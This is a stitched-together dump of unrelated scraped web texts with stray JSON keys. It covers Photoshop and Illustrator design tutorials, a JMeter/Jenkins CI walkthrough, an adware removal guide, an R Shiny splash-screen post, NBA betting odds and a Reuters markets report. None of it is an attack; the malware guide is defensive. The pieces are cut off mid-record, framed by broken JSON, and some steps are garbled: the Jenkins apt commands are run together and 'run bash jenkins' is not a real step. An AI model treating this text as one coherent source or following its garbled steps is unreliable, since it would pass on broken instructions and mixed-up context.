\nTo do so, select both of your shape layers\u2014you can do this by holding down Control (on PC) or Command (on Mac) while clicking, to select multiple layers at once. \nOnce you have both of these shape layers selected, right-click (on PC) or Control-click (on Mac) . Choose Merge Shapes from the resulting list of options. \nStep 7 \nAfter doing so, our shapes have been combined together into one shape, as seen below. \nStep 8 \nI thought it might be fun to try out an avatar here\u2014so I used an avatar maker to create a cute character! You can check it out right here. It requires Adobe Illustrator, but it's super easy to use (and a lot of fun!). \nOnce I'd created my character, I copied and pasted it into my document\u2014note that it is my top layer. It's on top of the shapes we created earlier. \nGraphical content is optional, but can add a lot to how you present your channel. Will you use a logo of some kind? An avatar or character? What do you visually associate with your channel and your work? \nStep 9 \nHowever, I wanted the character to stay inside the shape. Clipping Masks are just what the doctor ordered for this! \nTo apply a clipping mask, select the layer. Then, right-click (on PC) or Control-click (on Mac) . Select Create Clipping Mask from the resulting list of options. \nNote, the art has to be on top of the shape here\u2014we want the artwork to be confined to the space of the shape. \nStep 10 \nVoila! The artwork is confined to the shape, as shown below. \nStep 11 \nNext, let's add some type to our panel, using the Text Tool. \nWith the Text Tool selected, in the Tools panel, simply click on your canvas to start typing. Your text will automatically be placed on a new layer. \nI used the Philadelphia Signature font, and I decided to make this one a Twitch About Me panel. \nStep 12 \nNext, let\u2019s add a drop shadow to our combined shape. \nTo do so, select the layer containing our light blue shape. Then, click on Add Layer Styles , in the Layers panel. \nFrom the resulting menu, choose Drop Shadow . \nStep 13 \nHere are the Layer Style options\u2014and the values I decided to use. \nThe Blend Mode is set to Normal \u2014it displays as a normal, solid color. \nThe Opacity is 100% . \nAdjust the Angle, Distance, Spread, and Size to your liking. I chose to keep my Distance at 3 , Spread at 100% , and my Size at 2. \nI recommend toggling Preview on, so you can preview how these values affect your work. In my opinion, that's the best way to learn the visual impact of these values on your work\u2014see a live preview, and give them a try! \nStep 14 \nAnd here\u2019s our drop shadow, as shown below! \nNotice, in my layers, how we see \"Effects\" and \"Drop Shadow\" displayed under the layer where these effects have been applied. Double-click on this to edit your Layer Style. \nWe can also toggle their visibility on and off by clicking the eye symbol beside each word, just as we can toggle visibility on the entire layer. \nStep 15 \nLet\u2019s try adding another effect to our work. I\u2019d like to add a subtle gradient here. \nFirst, I\u2019m going to create an additional clipping mask. You could create a new layer, then follow the same process as before\u2014 right-click (on PC) or Control-click (on Mac) , then select Create Clipping Mask . \nHowever, if you have the shape layer selected and you create a new layer, it\u2019ll automatically make it a clipping mask, sandwiched between our other clipping masks. Convenient! \nStep 16 \nSelect the colors you\u2019d like to use. I went with a soft, light blue, and a light purple. Our gradient will gradually transition from this first color to the second. \nThen, use the Gradient Tool on our new clipping mask. Notice how the gradient is confined within the shape. \nStep 17 \nAs a finishing touch, I decided to change the color of my avatar\u2019s shirt! I used the Paint Bucket Tool to easily fill this color. \nRemember, when using any tool, make sure you have the correct layer selected! \nStep 18 \nOnce you\u2019re happy with your work, remember to Save ! \nI recommend saving a copy of your work, as well, so we can make multiple panels, without worrying about overwriting our original file. For example, you might want an About Me Twitch panel, a Discord twitch panel, or maybe something for your YouTube channel. We can essentially save our original as a Twitch panel template\u2014and use it again for other panels. \nSome of your panels might benefit from looking uniform. In this case, creating additional panels may be as simple as editing your text. Let's start there! \nFirst, I copied my \u201cAbout Me\u201d text layer. You can drag the layer down to the New Layer icon to easily duplicate layers\u2014or right-click (on PC) or Control-click (on Mac) , and then select Duplicate Layer . \nTo edit a text layer, simply click with the Text Tool . Then, I replaced my text. Voila! Now I have a second panel. \nStep 19 \nBut some of your panels might benefit from more variation than a text edit. Maybe you want a follow Twitch panel, or something that encourages viewers to subscribe to your work elsewhere. \nIn this example, I\u2019ve created a variant of our work for a YouTube channel. \nYou can use the Move Tool to easily move and rearrange your contents. I wanted this panel to stand out from the others, so I used a social media icon to further visually communicate that this streamer has a presence on YouTube. \nRemember to Save As \u2014save copies of your work, instead of overwriting the original! \nStep 20 \nBut let's say we really want to mix things up. Maybe we want to take the Twitch panel we've designed and make something quite varied from it. Don't forget to Save before you continue\u2014again, it's a good idea to save a copy! \nLet's adjust our canvas size. To do so, go to Image > Canvas Size . Select Pixels as your unit of measurement (you may, for example, see inches or centimeters, based on your default settings). \nRemember, our Twitch panel dimensions are deliberately set at 350 pixels wide\u2014this is what Twitch will resize our work to. So let's leave the width alone. For the height, however, let's give our work some more space. This panel will be larger than our others. \nI changed the height to 260 pixels . \nStep 21 \nWith my larger canvas size, I rearranged and revisited parts of my design. For example, I went back and left my ellipse and my rounded rectangle separate. I used the same gradient colors. \nSince this panel will vary more than my others, I decided to use it for my Twitch donation panel. \nStep 22 \nRemember our Drop Shadow? \nThis time I decided to try out an Inner Shadow\u2014this is another Layer Style, and it works almost the same way! You can find it under Add Layer Style , in your Layers panel, like before! \nThis layer is a white rounded rectangle with the Blending Mode set to Color Burn . This creates an overlay that gives the inside of my colored rectangle that inner shadow. Give it a try! \nUnfamiliar with Layer Styles and want to know more? Check out this tutorial! You can do some really cool things with Layer Styles. \nStep 23 \nFinally, I wanted some cute finishing touches. Have fun with your Twitch panels\u2014consider adding graphics, type, and colors that best reflect you\u2014your stream, your personality, and your channel! \nI used these heart-themed icons and the Knicknack font to add some extras to my panel design. \nAgain, keep in mind that the background here will be transparent! \nMake sure to choose Save As , to save copies of your work! Don't overwrite your original or variants of your design! \n2. How to Save Twitch Panel Graphics \nStep 1 \nNow that we've created some Twitch panels, let's get them all saved and exported, ready to upload on our Twitch channel. \nFirst things first, we have to get rid of our background layers. \nSelect your background layers. To select more than one layer at once, hold down Control (on PC) or Command (on Mac) while clicking, to select multiple layers. \nStep 2 \nThen, click on the Trash Can icon at the bottom of your Layers panel to delete your selected layers. \nHere's what my work looks like with my background layers deleted. Again, notice the checkered pattern\u2014this is how Photoshop visually indicates transparency, and that's what we want! We want the background to be transparent. \nStep 3 \nNow, it's time to merge our content together! \nAgain, select all of your visible layers. If this process is unclear, revisit Step 1. \nWith all of your visible layers selected, right-click (on PC) or Control-click (on Mac) , and then select Merge Visible , as shown below. \nStep 4 \nHere's what my work looks like with all my layers merged into one. Notice how I only have one layer in my Layers panel now\u2014and the area around my Twitch panel looks like a gray checkered pattern. This means that the background is transparent. \nDo not go to File > Save, or it will overwrite your work! It is generally a good idea to save a layered version of your work. This way, if you want to go back and make edits, you can easily do so. \nInstead, go to File > Save As to save a copy of your work. We want to save this as a PNG file, so our PNG image has this transparency. \n3. How to Use Twitch Panels \nStep 1 \nNow, let's dig into how to set up Twitch panels. \nRight under the video portion of your own channel, you'll see an Edit Panels button that you can toggle on or off. When Edit Panels is active, you'll see the purple color and check mark. \nStep 2 \nHere's what it looks like when we add a new panel. Click on the plus sign to add a panel. \nThen, click on Add a Text or Image Panel , to add text or imagery. \nStep 3 \nHere are our Twitch panel options. \nPanel Title \u2014this is a text title that we can give our panel. In this case, leave this blank. Otherwise, there will be large header text above our image. \nAdd Image \u2014click this to add your Twitch panel image. \nImage Links To \u2014this is the URL associated with your Twitch panel. So, for example, if you want viewers to click on the panel and it takes them to your shop or your YouTube channel, put that URL in here. \nDescription \u2014this is text that will display in your panel. You can use Markdown to add some formatting to your text. \nStep 4 \nSo let's go ahead and add one of our Twitch panel images! I decided to start with my About Me panel. \nClick Add Image to add your image. Locate the file on your computer, and then Twitch will give you a preview, like the one shown below. Make sure to resize the active area to include your entire image. \nWhen you're happy with the preview, click Done . \nStep 5 \nNow, we see a preview of our Twitch panel image, as shown below. \nI decided to add some text here\u2014it'll appear below my Twitch panel image. \nHere's a quick cheat sheet, when it comes to some basic Markdown you can use for formatting text in your Twitch panels: \n*Example* \u2014one asterisk, on either side of your text, will display your text in italics. \n**Example** \u2014two asterisks, on either side of your text, will display your text in bold. \nLinks\u2014to include a text link, format your text like this: [Envato]( https://envato.com) . \nHorizontal Rule\u2014include five asterisks to add a horizontal rule \nUnordered Lists\u2014use +, -, or * to create an unordered list of items. \nAnd there's more! Check out Twitch's Help Files for more information on ways you can format your text. \nStep 6 \nHere's a preview of how my About Me Twitch panel looks, both in Twitch's dark theme and light theme! \nYou can toggle between the themes in your Twitch settings. \nStep 7 \nHowever, there's even more you can do with your Twitch panels! \nInstead of an image or text panel, you can also use Extension Panels, as shown below. Adding an Extension Panel requires the Extension Manager. We won't focus on this, in this tutorial\u2014but check it out! There's so much to try, including countdowns to your next stream, leader boards, and a whole lot more! \nAnd That's Just the Beginning! \nThank you for joining me on this walkthrough! I hope you picked up some tips and tricks that will help you with your own Twitch channel panels! There are so many different ways you could create your panels\u2014and so many creative things you could do with them, too! \nGood luck, and happy streaming! \nLooking for some extra help?

      "text": "Hacker News \nJMeter and Jenkins \nWhere are we? \nInstalling Jenkins using Docker \nJenkins is installed locally in many ways depending on your OS. \nOn Mac, you can use brew : \nOn Debian, you can use apt : \nwget -q -O - https://pkg.jenkins.io/debian-stable/jenkins.io.key | sudo apt-key add - deb https://pkg.jenkins.io/debian-stable binary/ sudo apt update sudo apt install jenkins \nYou can find the instructions to other systems here . \nIn the end, you can simply run bash jenkins and the service will be up and running. \nThe command will give the initial administrator password. The next screens will guide you through Jenkins configuration. For our purposes you can simply use the default options. \nAfterwards Jenkins will be ready to go! \nRunning JMeter from the command line \nTo configure Jenkins, we will need to learn how to run our Jenkins plans from the command line. \nThe first step is to identify the location of your JMeter. On Linux and Windows, it will probably the folder that you extracted JMeter. On Mac, if you installed JMeter using brew, you can use where jmeter to find out (it will probably be /usr/local/bin/jmeter ). \nThen, to run JMeter in a NON_GUI fashion, you can run the following command: \nPATH_TO_JMETER/bin/jmeter -n -t PATH_TO_MY_PLAN/MY_PLAN.jmx -l PATH_WHERE_I_WANT_TO_SAVE_THE_RESULTS/MY_PLAN.jtl \nThe only new part is the cryptic .jtl file. This is a XML or CSV format used by JMeter to save its results. After you run the command, you shall see a new or updated file in the indicated folder. \nCreating a Jenkins job to execute the JMeter plan \nFor this example, we will be using a JMeter plan that makes call to the Open Maps API. \nFor starters, we will add the Performance plugin , in order to have nice reports on JMeter screen. \nTo add it, go to Manage Jenkins and Manage Plugins . \nThen Select Performance form the Available tab. \nNo restart is necessary. \nBack on Jenkins initial screen, you can click on create new jobs and then create a Freestyle project . \nClicking on Configure allows us to add the building steps. \nFirstly we will add a Build step execute the exact command we use before to run JMeter in NON-GUI mode. \nSecondly, we will add a Post-build step. The type will be Publishing Performance test result report , which is coupled to the Performance plugin. \nHere we just need to add the path to our .jtl file in the Source data files field. \nInformation overview \nAfter a couple of executions, you can see that the Performance plugin shows a trend chart on the job home page. \nAdditionally, you can see more detailed data into each execution. \nPossible improvements \nOf course, this is just the first step. \nYou can configure many triggers for the Jenkins job, such as a new commit on GitHub, a deployment on certain environment. \nAlso you can configure the JMeter plan itself, for instance, by passing arguments on the non-GUI command . \nConclusion \nThis ends the 5-part series to introduce JMeter, from the basics concepts to continous execution. You can check out the whole series here .",

      "text": "If your web browser is constantly being redirected to the O333o.com site, then it is possible that you have adware installed on your computer. \nWhat is O333o.com? \nO333o.com is part of an advertising service that website publishers use to generate revenue on their sites. Unfortunately, there are some malicious programs that are injecting these O333o.com ads on websites you visit without the permission of the publisher in order to generate revenue. \nWhen O333o.com redirects a browser to an advertisement, the ads are typically for unwanted chrome extensions, surveys, adult sites, online web games, fake software updates, and unwanted programs. \nWhy am I seeing the O333o.com pop-up ads? \nYou are seeing the O333o.com pop-up ads because you are either infected with adware or another web site is redirecting you to them. \nThis guide was written to help Windows users remove malware from their devices, so if you\u2019re just looking for a way to block the O333o.com redirect on a specific site, then you can use a free browser extension like Adblock . \nWhen it comes to adware, these malicious programs are bundled with other free software that you download off of the Internet. Unfortunately, some free downloads do not adequately disclose that other software will also be installed and you may find that you have installed adware without your knowledge. Once an adware program is installed on your device, whenever you will browse the Internet, the O333o.com site will redirect your browser to unwanted advertisements. \nHere are a few typical signs that you have adware on your system: \nAdvertisements appear in places they shouldn\u2019t be. \nYour web browser\u2019s homepage has mysteriously changed without your permission. \nWeb pages that you typically visit are not displaying properly. \nWebsite links redirect to sites different from what you expected. \nBrowser popups appear which recommend fake updates or other software. \nOther unwanted programs might get installed without your knowledge. \nYou should always pay attention when installing software because often, a software installer includes optional installs. Be very careful what you agree to install. \nAlways opt for the custom installation and deselect anything that is not familiar, especially optional software that you never wanted to download and install in the first place. It goes without saying that you should not install software that you don\u2019t trust. \nTo check your computer for adware and remove it for free, please use the guide below. \nHow to remove O333o.com redirect (Virus Removal Guide) \nThis malware removal guide may appear overwhelming due to the number of steps and numerous programs that are being used. We have only written it this way to provide clear, detailed, and easy to understand instructions that anyone can use to remove malware for free. \nPlease perform all the steps in the correct order. If you have any questions or doubts at any point, \nstop \nand \nask for our assistance \n. \nThe below instructions are for Windows users, however, we also have an \nAndroid Guide \nand a \nMac Guide \nwhich should help clean up your device. \nTo remove the O333o.com redirect, follow these steps: \nSTEP 1: Uninstall the malicious programs from Windows \nIn this first step, we will try to identify and remove any malicious program that might be installed on your computer. \nGo to \u201cPrograms and Features\u201d. \nWindows 10 \nWindows 8 \nRight-click on the \nStart \nbutton in the lower-left corner and select \n\u201cPrograms and Features\u201d \n. This will take you directly to your list of installed programs. \nIf you can\u2019t find the Programs and Features in the Start menu, type \u201cprograms and features\u201d into the search bar at the bottom of the Start window, then click the \u201cPrograms and Features\u201d result. \nIf you don\u2019t have a Start button, you are likely running Windows 8 instead of Windows 8.1. Press the Windows key + X to open the menu instead and select \u201cPrograms and Features\u201d . \nWindows 7 \nFind the malicious program and uninstall it. \nThe \u201cPrograms and Features\u201d screen will be displayed with a list of all the programs installed on your PC. Scroll through the list until you find the malicious program, then click to highlight it , then click the \u201cUninstall\u201d button that appears on the top toolbar. \nLook out for any suspicious program that could be behind all the drama \u2013 anything you don\u2019t remember downloading or that doesn\u2019t sound like a genuine program. Here are some known malicious programs: PDFPoof, BatBitRst, MessengerNow, SearchAd, MyPrintableCoupons, Reading Cursors, ProMediaConverter, PDFOnline-express, See Scenic Elf, Clickware, Easy Speedtest, or WebDiscover. \nThe malicious program may have a different name on your computer. If you cannot find any malicious programs on your computer, you can continue with STEP 2 . \nFollow the on-screen prompts to uninstall the program. \nIn the next message box, confirm the uninstall process by clicking on Yes , then follow the prompts to uninstall the program. \nMake sure to read all of the prompts carefully, because some malicious programs try to sneak things in hoping that you won\u2019t read closely. \nIf you are having issues while trying to uninstall a program, you can use \nRevo Uninstaller Free \nto completely remove an unwanted program from your computer. \nSTEP 2: Use Malwarebytes Free to remove O333o.com redirect \nMalwarebytes is one of the most popular and most used anti-malware software for Windows, and for good reasons. It is able to destroy many types of malware that other software tends to miss, without costing you absolutely nothing. When it comes to cleaning up an infected device, Malwarebytes has always been free and we recommend it as an essential tool in the fight against malware. \nThe first time you install Malwarebytes, you\u2019re given a free 14-day trial of the premium edition, which includes preventative tools like real-time scanning and specific protection from ransomware. After two weeks, it automatically reverts to the basic free version that will detect and clean up malware infections only when you run a scan. It is important to note that Malwarebytes will run alongside antivirus software without conflicts. \nDownload Malwarebytes. \nYou can download Malwarebytes by clicking the link below. \nDouble-click on the Malwarebytes setup file. \nWhen Malwarebytes has finished downloading, double-click on the mb3-setup-consumer-x.x.x.xxxx.exe file to install Malwarebytes on your PC. In most cases, downloaded files are saved to the Downloads folder. \nYou may be presented with a User Account Control pop-up asking if you want to allow Malwarebytes to make changes to your device. If this happens, you should click \u201c Yes \u201d to continue with the installation. \nFollow the on-screen prompts to install Malwarebytes. \nWhen the Malwarebytes installation begins, you will see the Malwarebytes Setup Wizard which will guide you through the installation process. To install Malwarebytes on your PC, click on the \u201c Agree and Install \u201d button. \nClick on \u201cScan Now\u201d. \nOnce installed, Malwarebytes will automatically start and update the antivirus database. To perform a system scan, click on the \u201c Scan Now \u201d button. \nWait for the Malwarebytes scan to complete. \nMalwarebytes will now start scanning your computer for adware and other malicious programs. This process can take a few minutes, so we suggest you do something else and periodically check on the status of the scan to see when it is finished. \nClick on \u201cQuarantine Selected\u201d. \nWhen the scan has completed, you will be presented with a screen showing the malware infections that Malwarebytes has detected. To remove the malicious programs that Malwarebytes has found, click on the \u201c Quarantine Selected \u201d button. \nReboot your computer. \nMalwarebytes will now remove all the malicious files and registry keys that it has found. To complete the malware removal process, Malwarebytes may ask you to restart your computer. \nWhen the malware removal process is complete, you can close Malwarebytes and continue with the rest of the instructions. \nSTEP 3: Use HitmanPro to scan for malware and unwanted programs \nHitmanPro is a second opinion scanner that takes a unique cloud-based approach to malware scanning. HitmanPro scans the behavior of active files and also files in locations where malware normally resides for suspicious activity. If it finds a suspicious file that\u2019s not already known, HitmanPro sends it to their clouds to be scanned by two of the best antivirus engines today, which are Bitdefender and Kaspersky. \nAlthough HitmanPro is shareware and costs $24.95 for 1 year on 1 PC, there is actually no limit in scanning. The limitation only kicks in when there is a need to remove or quarantine detected malware by HitmanPro on your system and by then, you can activate the one time 30-days trial to enable the cleanup. \nDownload HitmanPro. \nYou can download HitmanPro by clicking the link below. \nInstall HitmanPro. \nWhen HitmanPro has finished downloading, double-click on \u201chitmanpro.exe\u201d (for 32-bit versions of Windows) or \u201chitmanpro_x64.exe\u201d (for 64-bit versions of Windows) to install this program on your PC. In most cases, downloaded files are saved to the Downloads folder. \nYou may be presented with a User Account Control pop-up asking if you want to allow HitmanPro to make changes to your computer. If this happens, you should click \u201c Yes \u201d to continue with the installation. \nFollow the on-screen prompts. \nWhen HitmanPro starts you will be presented with the start screen as shown below. Click on the \u201c Next \u201d button to perform a system scan. \nWait for the HitmanPro scan to complete. \nHitmanPro will now begin to scan your computer for malicious programs. This process will take a few minutes. \nClick on \u201cNext\u201d. \nWhen HitmanPro has finished the scan, it will display a list of all the malware that the program has found. Click on the \u201c Next \u201d button to remove the malicious programs. \nClick on \u201cActivate free license\u201d. \nClick on the \u201c Activate free license \u201d button to begin the free 30 days trial and remove all the malicious files from your PC. \nWhen the process is complete, you can close HitmanPro and continue with the rest of the instructions. \nSTEP 4: Double-check for malicious programs with AdwCleaner \nAdwCleaner is a free popular on-demand scanner which can detect and remove malware that even the most well-known anti-virus and anti-malware applications fail to find. \nWhile the Malwarebytes and HitmanPro scans are more than enough, we\u2019re recommending AdwCleaner to users who still have malware related issues or just want to make sure their computer is 100% clean. \nDownload AdwCleaner. \nYou can download AdwCleaner by clicking the link below. \nDouble-click on the setup file. \nDouble-click on the file named \u201cadwcleaner_7.x.x.exe\u201d to start AdwCleaner. In most cases, downloaded files are saved to the Downloads folder. \nYou may be presented with a User Account Control dialog asking you if you want to run this file. If this happens, you should click \u201c Yes \u201d to continue with the installation. \nClick on \u201cScan Now\u201d. \nWhen AdwCleaner will start, click on the \u201c Scan Now \u201d button to perform a system scan. \nWait for the AdwCleaner scan to complete. \nAdwCleaner will now scan your PC for malicious files. This process can take a few minutes. \nClick on \u201cClean & Repair\u201d. \nWhen AdwCleaner has finished it will display a list of all the malware that the program found. Click on the \u201c Clean & Repair \u201d button to remove the malicious files from your computer. \nClick on \u201cClean & Restart Now\u201d \nWhen the malware removal process is complete, AdwCleaner may need to restart your device. Click on the \u201c Clean & Restart Now \u201d button to finish the removal process. \n(OPTIONAL) STEP 5: Reset the browser settings to remove O333o.com \nIf your web browser is still being redirected to O333o.com, we will need to reset its settings to their original defaults. This step should be performed only if your issues have not been solved by the previous steps. \nGoogle Chrome \nResetting your browser settings will reset the unwanted changes caused by installing other programs. However, your saved bookmarks and passwords will not be cleared or changed. \nTo remove O333o.com redirect from Google Chrome, follow these steps. \nOpen Chrome\u2019s \u201cSettings\u201d menu. \nClick on Chrome\u2019s main menu button, represented by three horizontal lines.

      "text": "In this tutorial, we\u2019ll create a simple windmill vector in a trendy, flat style\u2014all in just 10 steps! Learn about basic geometric shapes, strokes, the Free Transform Tool (E) , and handy shortcuts in Adobe Illustrator. Let\u2019s start! \nTutorial Details \u2013 Flat Windmill Vector \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Shape Building, Stroke panel, Free Transform Tool (E) \nEstimated Completion Time: 20 minutes \nFinal Image: Flat Windmill in Adobe Illustrator \nStep 1 \nTo start making your windmill vector, first take the Rectangle Tool (M) and make a base of our building from a 120\u00d7140 px white rectangle. \nNow grab the Free Transform Tool (E) and click and hold one of the top anchor points. Press Alt-Control-Shift and move the point closer to the center of the top edge, this way making the top of the rectangle narrower. \nStep 2 \nUse the Pen Tool (P) to make an additional anchor point in the center of the top edge or go to Object > Path > Add Anchor Points . \nSelect the created point with the Direct Selection Tool (A) and drag it up, making the roof of the building pointed. \nStep 3 \nUse the Rounded Rectangle Tool to create an 110\u00d710 px brown shape with 5 px Corner radius at the top of the building. \nUse the Rectangle Tool (M) to add a 40\u00d750 px shape for the door. Select both top corners of the door using the Direct Selection Tool (A) and pull the circle markers of the Live Corners to make the top of the shape 20 px rounded. \nAdd another rounded rectangle above the door. \nIn order to make sure that everything is centered perfectly, select all the elements and click Horizontal Align Center in the Align panel (Window > Align). \nStep 4 \nSelect the door using the Selection Tool (V) , hold Alt-Shift and drag it up, creating a copy to depict the window. \nKeeping the created copy selected, go to Object > Path > Offset Path . Set the Offset value to -5 px and click OK. Make the frame of the window a bit lighter. \nStep 5 \nLet\u2019s add some bricks to the bottom half of this windmill vector. Make a 25\u00d710 px light-grey rounded rectangle with 5 px corners radius. \nAdd more bricks and make some of them cross the edges of the mill. \nSelect the mill and the bricks that are crossing the edges. Take the Shape Builder Tool (Shift-M) , hold Alt and click the pieces that we need to delete. \nStep 6 \nNow let\u2019s color the roof. Select the base of the mill and duplicate it (Control-C > Control-F). Keeping the top copy selected, take the Knife tool and make a line across the building, separating the triangular top. \nNow we can select the created triangle with the Direct Selection Tool (A) and change its color to dark-brown. \nStep 7 \nLet\u2019s make the arm of the mill from a 30\u00d7130 px rectangle. Set its Fill color to dark-orange and its Stroke color to lighter orange. Open the Stroke panel (Window > Stroke) and set the Weight to 5 pt, Align Stroke to Inside. \nUse the Line Segment Tool (\\) while holding down Shift to make a vertical stroke across the rectangle. Set its Weight to 5 pt . Use the Align panel to center both shapes horizontally. \nStep 8 \nAdd a short horizontal stroke across the rectangle. Select it with the Selection Tool (V) , hold Alt-Shift and drag down to create a copy. Press Control-D multiple times to create more copies. \nStep 9 \nGroup (Control-G) all the elements of the arm and double-click the Reflect Tool (O) . Flip the object over the Horizontal Axis and click Copy. \nHold Shift and drag the copy down. Create a 20\u00d720 px circle at the point where two arms meet. \nStep 10 \nSelect the two arms that we\u2019ve created and duplicate (Control-C > Control-F) them. Rotate the copies 90 degrees using the Selection Tool (V). \nAttach the arms to our mill and rotate the construction 45 degrees. \nAdd minor details to the mill \u2013 a rounded rectangle at the bottom edge and two crossed planks in the window. \nCongratulations! Our Windmill Vector is Ready! \nUse the Rounded Rectangle Tool if you want to make the composition look a bit more completed by adding a ground and the clouds. \nYou\u2019re all done! I hope you\u2019ve enjoyed following this simple tutorial and learned some new tips and tricks! Use them to create new flat illustrations and have fun! \nThe post 10 Simple Steps to Make a Flat Windmill Vector in Adobe Illustrator appeared first on Vectips .",

      "title": "Shiny splash screen using modules and shinyjs",
      "text": "[This article was first published on Anindya Mozumdar , and kindly contributed to R-bloggers ]. (You can report issue about the content on this page here ) \nWant to share your content on R-bloggers? click here if you have a blog, or here if you don't. \nA while ago I was researching on creating a splash screen for a Shiny application. My gut feel was that there will readily be a package available for this activity. I was surprised to see that not much information is available based on a 10 minute Google search. The top StackOverflow question which comes up with a search for \u2018r shiny splash screen\u2019 is this which recommends a modal dialog. I also discovered the waiter package which is very cool. \nIn this article, I present a solution using Shiny modules and the shinyjs package. I am not sure the solution is scalable for a very complex application, but should work for simple applications. The gif file used in the demo application was downloaded from giphy . \nThe key ideas to do this are very simple \ncreate a module for the UI and server which forms your main application \ncreate another module to display an image as a splash screen \ndisplay the image for a few seconds and then hide it \nthe main application UI should be hidden by default and should be shown a few miliseconds after the splash screen has been hidden \nThe last two tasks are accomplished using functions from the shinyjs package. \nFor the demo application, I took the default code created by RStudio when you create a Shiny project. This is a simple visualization of the faithful dataset, where the number of bins in the histogram are controlled by a slider input. The code for this, with some modifications, are defined in the module mainapp . \nmainapp_ui <- function(id) { ns <- NS(id) fluidPage( # Application title hidden(div(id = ns(\"app_title\"), titlePanel(\"Old Faithful Geyser Data\"))), # Application UI elements hidden( fluidRow(id = ns(\"app_slider_plot\"), column( 4, sliderInput(ns(\"bins\"), \"Number of bins:\", min = 1, max = 50, value = 30) ), column( 8, plotOutput(ns(\"distPlot\")) ) ) ) ) } mainapp_server <- function(input, output, session) { delay(ms = 3500, show(\"app_title\")) delay(ms = 3800, show(\"app_slider_plot\")) output$distPlot <- renderPlot({ # generate bins based on input$bins from ui.R x <- faithful[, 2] bins <- seq(min(x), max(x), length.out = input$bins + 1) # draw the histogram with the specified number of bins hist(x, breaks = bins, col = 'darkgray', border = 'white') }) } \nI have converted the sidebarLayout into a single fluidRow divided into two columns. Note that the row has been provided an id of app_slider_plot and is hidden by default. The same is true of the titlePanel \u2013 as an id cannot be defined for a titlePanel , this has been wrapped in a HTML div . In the server function for this module, we use the show function from the shinyjs package to display the title and the application UI elements, but only after a delay of around three and a half seconds. As we see below, this is because the initial splash screen is shown for three seconds. \nsplash_ui <- function(id) { ns <- NS(id) div(id = ns(\"splash_screen\"), img(src = \"giphy.gif\"), style = \"text-align:center; padding-top:250px;\") } splash_server <- function(input, output, session) { hide(\"splash_screen\", anim = TRUE, animType = \"fade\", time = 3) } \nThe module for the splash screen is really simple. It just loads a GIF image which is animated to provide the appearance that the app is being loaded. Creative people will also include some kind of logo and branding as part of this image. The code in the server function ensures that the image is hidden after three seconds. This action is also animated to make it slightly cooler. \nThe UI and server for the full Shiny application is really simple. \n# Define UI for application that draws a histogram ui <- fluidPage( useShinyjs(), fluidRow(splash_ui(\"splash_module\")), fluidRow(mainapp_ui(\"mainapp_module\")) ) # Define server logic required to draw a histogram server <- function(input, output) { ss <- callModule(splash_server, \"splash_module\") ma <- callModule(mainapp_server, \"mainapp_module\") } \nThe useShinyjs function is required to enable shinyjs. Other than that, it simply calls the modules for the main application and the splash screen. \nThe complete code is available in Github . \nTo leave a comment for the author, please follow the link and comment on their blog: Anindya Mozumdar .

It's done. \nIt will tell you how many posts you created, the number of likes you received and how many likes on average you would get per post. \nHowever, if you have a private account you will not be able to use the desktop version. \nInstead, you'll have to download the application on your mobile phone called Top Nine. You can also use the app called Best Nine. \nIt may take a while to compile your top nine posts as thousands of people are using the app daily. \nAnd that's all there is to it.

      "text": "The Los Angeles Clippers are the biggest underdogs in an NBA playoff series in the past 30 years. \nAt the SuperBook at Westgate Las Vegas, the Clippers are 100-1 to upset the two-time defending champion Golden State Warriors in their best-of-seven first-round series, which tips off Saturday (8:15 p.m. ET, ABC). \nAccording to online archive SportsOddsHistory.com, since 1988 only three teams have entered an NBA playoff series with odds greater than 50-1: The 2013 Milwaukee Bucks (vs. the Miami Heat ) and 1992 Miami Heat (vs. the Chicago Bulls ) were each 75-1, and the 2016 Memphis Grizzlies were 66-1 against the San Antonio Spurs . \nThe Warriors are -50,000 to beat the Clippers at the SuperBook, meaning bettors would need to put $50,000 on Golden State to win $100. According to SuperBook director of race and sports John Murray, there had been no straight bets on the Warriors for the series as of Friday morning, while nine bets were placed on the Clippers, ranging from $2 to $100. \nSome bettors had included the Warriors in parlays, including a $37,000 three-leg parlay that included heavy first-round favorites -- Milwaukee and the Toronto Raptors along with Golden State. The bet would pay a net $3,100 if all three teams advance to the second round, according to Murray. \nThe odds are so lopsided on the Clippers-Warriors series that some Las Vegas sportsbooks chose to keep it off the board. \nGolden State is an odds-on favorite at around -200 to win its third straight NBA title. The Bucks are next at +600, followed by the Houston Rockets (+800). The Raptors are +1,200, and the Philadelphia 76ers and Boston Celtics are +1,800. \nAt the SuperBook, more money was bet on the Warriors to win the NBA title this season than all but one team -- the Los Angeles Lakers , who missed the playoffs for the sixth straight season.",

      "text": "* Trump said trade deal with China might be out in 4 weeks * Singapore posts biggest weekly gain in 12 weeks * Philippine inflation eases, interest rate cut expected By Shreya Mariam Job April 5 (Reuters) - Southeast Asian stock markets were rangebound on Friday as mixed reports about progress on a trade deal between Washington and Beijing left investors cautious about taking on more risk. U.S. President Donald Trump on Thursday said the United States and China were close to a trade deal that could be announced within four weeks, while warning Beijing that it would be difficult to allow trade to continue without a pact. Also under the investor radar is the U.S. payrolls report, which is forecast to rebound to 180,000 in March, following February's distorted 20,000 rise, which points to stronger labour market strength amid concerns of economic risks. Philippine stocks rebounded from previous session's losses to end higher, with gains concentrated in the financial sector. For the week, however, the index posted a 0.6 percent fall. Philippine inflation eased in March to its slowest annual pace in 15 months on easing food prices. It compounded signs that the central bank could take advantage of the cooling inflation to reverse some of last year's policy tightening to support economic growth. \"Another benign inflation print in April should allow the BSP (Bangko Sentral ng Pilipinas) to cut its Overnight Reverse Repurchase Rate (RRP) by 25bps at its May meeting,\" economists Mustafa Ali and Sanjay Mathur said in an ANZ report. Ayala Corp and Metropolitan Bank and Trust Co picked up 1.8 percent and 1.1 percent, respectively. The Singapore benchmark index closed higher, boosted by gains in financials. Top lenders extended their strength with DBS Group Holdings Ltd, Oversea-Chinese Banking Corporation Ltd, and United Overseas Bank Ltd climbing between 0.4 percent and 0.7 percent. The index posted a 3.4 percent gain for the week, its highest weekly gain in 12. Financials and energy shares dragged the Indonesian index 0.3 percent lower; but it closed 0.1 percent firmer on the week. Bank Central Asia Tbk Pt slid 0.7 percent, while Bank Mandiri Tbk Pt dropped 1.6 percent. Malaysian stocks snapped a three-session winning streak to close 0.2 percent weaker. Telecom stocks dragged the index lower with Maxis Bhd dropping 2 percent.

      "title": "China\u2019s New Policy Isn\u2019t An Automatic Bitcoin Mining Ban \u2013 Here\u2019s Why",
